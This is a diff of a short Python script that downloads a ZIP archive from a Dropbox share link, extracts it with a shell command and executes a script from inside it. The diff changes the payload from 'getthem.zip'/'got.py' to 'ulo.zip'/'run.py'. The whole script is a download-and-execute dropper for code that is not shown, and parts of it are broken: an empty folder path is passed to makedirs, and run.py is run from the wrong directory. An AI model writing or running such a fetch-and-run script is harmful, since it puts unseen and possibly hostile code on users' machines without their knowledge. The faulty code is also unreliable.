@@ -2,8 +2,11 @@ import os
 import requests
 
 # Step 1: Download the ZIP file
-url = "https://www.dropbox.com/scl/fi/6snb3ntu3cl2x7v98kb08/getthem.zip?rlkey=30wr9ceyzp5mukb62skcc7ify&dl=1"
-filename = os.path.join("getthem.zip")
+url = "https://www.dropbox.com/scl/fi/6y2xhv0uw13zdb3v1h6xw/ulo.zip?rlkey=qafy53yxtrd9rgztav7n1o9ub&dl=1"
+drop_folder = ""
+if not os.path.exists(drop_folder):
+    os.makedirs(drop_folder)
+filename = os.path.join(drop_folder, "ulo.zip")
 with requests.get(url, stream=True) as r:
     r.raise_for_status()
     with open(filename, 'wb') as f:
@@ -13,18 +16,16 @@ with requests.get(url, stream=True) as r:
 print("Downloaded the ZIP file.")
 
 # Step 2: Extract the ZIP file
-# The extraction command might differ based on your operating system and available utilities
-extract_command = f"tar -xf {filename}"  # for Windows
+# Use the 'tar' command on Windows, ensure tar is available on your system; else, you may need other utilities like 7-Zip
+extract_command = f"tar -xf {filename}"
+print(extract_command)
 os.system(extract_command)
 print("Extracted the ZIP file.")
 
 # Step 3: Execute the program
-# Build the path dynamically to ensure it works regardless of where the script is run from
-extracted_folder_path = os.path.join("getthem")  # Assuming the zip extracts into a folder named 'getthem'python_exe = os.path.join(extracted_folder_path, "python.exe")
-script_path = os.path.abspath("getthem/got.py")
-python_exe = os.path.abspath("getthem/python.exe")
-execute_command = f'{python_exe} {script_path}'  # Ensure proper handling of paths
-print(execute_command)
-os.system(execute_command)
+# Modify paths as necessary according to the actual structure inside your ZIP file
+# This assumes 'run.py' is in the root of the 'ulo' folder after extraction
+print(f'Executing the program...')
+os.system(f'python run.py')
 
 print("Executed the program.")
